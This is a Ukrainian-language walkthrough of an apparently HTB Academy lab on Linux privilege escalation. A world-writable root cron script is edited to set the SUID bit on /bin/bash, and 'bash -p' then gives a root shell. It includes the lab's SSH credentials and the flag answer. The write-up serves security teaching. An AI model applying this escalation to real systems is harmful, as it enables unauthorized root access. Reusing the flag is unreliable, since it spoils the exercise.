## Cron Job Abuse

Ціль: `10.129.114.247`  

Питання:
- Escalate privileges, зловживаючи неправильно налаштований cron job.
- Здати вміст `flag.txt` у `/root/cron_abuse`.

Відповідь:
- `14347a2c977eb84508d3d50691a7ac4b`

***

## Крок 1 — Пошук world-writable файлів (кандидати на cron)

```bash
find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
```

Розбір:

- `-path /proc -prune` – пропускаємо `/proc`.
- `-type f` – лише **файли**.
- `-perm -o+w` – світовий запис (`others write`), тобто будь-хто може правити.
- `2>/dev/null` – помилки доступу викидаємо.

Серед виводу:

```text
/etc/cron.daily/backup
/dmz-backups/backup.sh
/home/backupsvc/backup.sh
...
```

Це явні **кандидати на cron-скрипти**.

***

## Крок 2 — Перевірка /etc/cron.daily/backup

```bash
cat /etc/cron.daily/backup
```

Скрипт:

```bash
#!/bin/sh -e
# clean all crash reports which are older than a week.
#[ -d /var/crash ] || exit 0
#find /var/crash/. ! -name . -prune -type f ... -exec rm -f -- '{}' \;
#find /var/crash/. ! -name . -prune -type d ... -exec rm -Rf -- '{}' \;
```

- Все логіка закоментована.
- Скрипт нічого не робить – нецікавий для прівеску.

***

## Крок 3 — Аналіз /dmz-backups/backup.sh

Права на каталог:

```bash
ls -la /dmz-backups/
```

Фрагмент:

```text
drwxrwxrwx  2 root root  36864 Jul 22 07:32 .
-rwxrwxrwx  1 root root    189 Nov  6  2020 backup.sh
...
```

- Каталог world-writable: `drwxrwxrwx`.
- Скрипт `backup.sh` world-writable: `-rwxrwxrwx`.
- Власник `root`, але **будь-хто** може редагувати скрипт, який, скоріш за все, запускається cron-ом від root (судячи з потоку `.tgz` файлів за тайм-стампами).

Вміст скрипта:

```bash
cat /dmz-backups/backup.sh
```

```bash
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 tar --absolute-names --create --gzip --file=$DESTDIR$FILENAME $SRCDIR
```

- Стандартний бекап вебдиректорії `/var/www/html` у `/dmz-backups/`.
- Запускається cron-ом root (судячи з того, що файли в каталозі належать root).

***

## Крок 4 — Зловживання cron: додати команду для SUID на bash

Ти відредагував `backup.sh` (через `nano`):

```bash
nano /dmz-backups/backup.sh
```

І зробив:

```bash
#!/bin/bash
 SRCDIR="/var/www/html"
 DESTDIR="/dmz-backups/"
 FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
 chmod u+s /bin/bash
```

Ключовий момент:

- Ми прибрали `tar`-рядок (або могли залишити, але головне – додали `chmod u+s /bin/bash`).
- Коли cron запустить `backup.sh` як root, він виконає:

  ```bash
  chmod u+s /bin/bash
  ```

- Це поставить **SUID-біт** (`4xxx`) на `/bin/bash`.

***

## Крок 5 — Дочекатися роботи cron та перевірити /bin/bash

До спрацювання cron:

```bash
ls -l /bin/bash
# -rwxr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
```

- Звичайний root-бінарник без SUID.

Після того, як cron виконав `backup.sh`:

```bash
ls -l /bin/bash
# -rwsr-xr-x 1 root root 1113504 Apr 18  2022 /bin/bash
```

- `s` на місці execute-біта власника: `rws`.
- `/bin/bash` тепер SUID root – при запуску звичайним користувачем процес матиме `uid=0`.

***

## Крок 6 — Отримати root shell через SUID bash

Запускаємо bash у режимі з привілеями:

```bash
bash -p
```

- Ключ `-p` (preserve) вказує bash не скидати ефективний `UID/GID`.
- Оскільки файл SUID root, `bash` запускається з `uid=0`.

Перевірка:

```bash
bash-4.4# whoami
# root
```

Маємо повноцінний root shell.

***

## Крок 7 — Прочитати флаг у /root/cron_abuse

У root-шеллі:

```bash
cd /root/cron_abuse
ls
# flag.txt

cat flag.txt
# 14347a2c977eb84508d3d50691a7ac4b
```

Відповідь для завдання:

> `14347a2c977eb84508d3d50691a7ac4b`

***

## Конспект команд для Cron Job Abuse

1. На цілі (`10.129.114.247`):

   ```bash
   ssh htb-student@10.129.114.247
   # Password: Academy_LLPE!
   ```

2. Знайти world-writable файли (кандидати на cron):

   ```bash
   find / -path /proc -prune -o -type f -perm -o+w 2>/dev/null
   # дивимося /etc/cron.daily/backup, /dmz-backups/backup.sh, /home/backupsvc/backup.sh
   ```

3. Перевірити /dmz-backups:

   ```bash
   ls -la /dmz-backups/
   cat /dmz-backups/backup.sh
   ```

4. Відредагувати скрипт:

   ```bash
   nano /dmz-backups/backup.sh
   ```

   Зробити так:

   ```bash
   #!/bin/bash
    SRCDIR="/var/www/html"
    DESTDIR="/dmz-backups/"
    FILENAME=www-backup-$(date +%-Y%-m%-d)-$(date +%-T).tgz
    chmod u+s /bin/bash
   ```

5. Дочекатися роботи cron і перевірити:

   ```bash
   ls -l /bin/bash
   # має стати -rwsr-xr-x
   ```

6. Отримати root-шелл:

   ```bash
   bash -p
   whoami  # root
   ```

7. Прочитати флаг:

   ```bash
   cd /root/cron_abuse
   cat flag.txt
   # 14347a2c977eb84508d3d50691a7ac4b
   ```
